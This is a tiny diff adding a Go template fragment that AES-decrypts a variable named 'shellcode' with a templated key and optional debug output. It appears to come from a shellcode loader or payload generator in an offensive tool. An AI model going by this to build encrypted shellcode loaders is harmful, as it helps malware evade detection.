@@ -1,0 +1,8 @@
+shellcode, errAes := decryptAES(shellcode, "{{.Key}}")
+
+if errAes != nil {
+	{{if .Debug}}
+	printDebug("error","AES decrypt function error: %s", errAes)
+	{{end}}
+	return
+}
